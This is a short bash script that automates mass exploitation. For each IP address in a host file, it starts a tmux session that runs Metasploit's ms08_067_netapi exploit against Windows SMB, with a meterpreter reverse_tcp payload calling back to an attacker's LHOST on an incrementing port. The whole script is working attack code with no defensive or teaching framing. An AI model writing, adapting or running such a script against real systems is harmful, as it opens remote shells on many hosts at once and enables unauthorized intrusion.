#!/bin/bash

if [ $# != 2 ];then
	echo "Usage: $0 [host file] [LHOST]"
	exit
fi

iplist=$1
lhost=$2

i=4444
for ip in $(cat $iplist);do
	tmux new -s reverse_$i -d
	tmux send-keys -t reverse_$i "msfconsole -x \"use exploit/windows/smb/ms08_067_netapi;set PAYLOAD windows/meterpreter/reverse_tcp;set RHOST $ip;set LHOST $lhost;set LPORT $i;run\"" C-m
	i=`expr $i + 1`
done
